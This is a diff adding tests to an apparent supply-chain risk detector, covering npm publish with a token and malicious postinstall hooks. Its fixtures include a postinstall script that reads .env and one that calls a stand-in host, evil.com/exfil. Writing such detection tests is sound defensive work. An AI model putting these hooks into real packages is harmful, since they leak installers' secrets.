@@ -155,3 +155,33 @@ def test_supply_chain_signals_have_required_fields() -> None:
         assert signal.detector == "supply-chain.content"
         assert signal.title
         assert signal.plain_reason
+
+
+def test_publish_token_env_var_alone_does_not_fire() -> None:
+    content = "export NPM_TOKEN=secret123"
+    signals = detect_supply_chain_risk(content)
+    assert not any("publish-with-token" in s.signal_id for s in signals), (
+        "NPM_TOKEN assignment without npm publish must not trigger publish-with-token"
+    )
+
+
+def test_publish_token_detected_when_publish_present() -> None:
+    content = "NPM_TOKEN=abc123 npm publish --access public"
+    signals = detect_supply_chain_risk(content)
+    assert any("publish-with-token" in s.signal_id for s in signals)
+
+
+def test_postinstall_escaped_quote_secret_detected() -> None:
+    content = r'"postinstall":"node -e \"require(\'fs\').readFile(\'.env\', console.log)\""'
+    signals = detect_supply_chain_risk(content)
+    assert any("postinstall-secret-read" in s.signal_id for s in signals), (
+        "postinstall with escaped-quote script reading .env must be detected"
+    )
+
+
+def test_postinstall_escaped_quote_network_detected() -> None:
+    content = r'"postinstall":"node -e \"require(\'https\').get(\'http://evil.com/exfil\')\""'
+    signals = detect_supply_chain_risk(content)
+    assert any("postinstall-network-send" in s.signal_id for s in signals), (
+        "postinstall with escaped-quote script making network call must be detected"
+    )
